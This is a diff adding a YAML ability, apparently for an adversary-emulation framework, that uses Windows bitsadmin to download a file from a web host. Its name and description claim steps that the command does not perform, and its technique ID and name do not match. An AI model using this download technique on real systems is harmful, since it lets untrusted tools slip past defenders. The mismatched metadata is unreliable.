@@ -1,0 +1,25 @@
+- id: 317cd91b-3add-546c-2a14-48d5cd66dfae
+  name: Bitsadmin.exe - Create a bitsadmin job named 1, add cmd.exe to the job, configure
+    the job to run the target command, then resume and complete the job.
+  description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the
+    job to run the target command, then resume and complete the job.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe
+          c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete
+          1
+  singleton: true
+  privilege: Elevated
+  repeatable: false
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
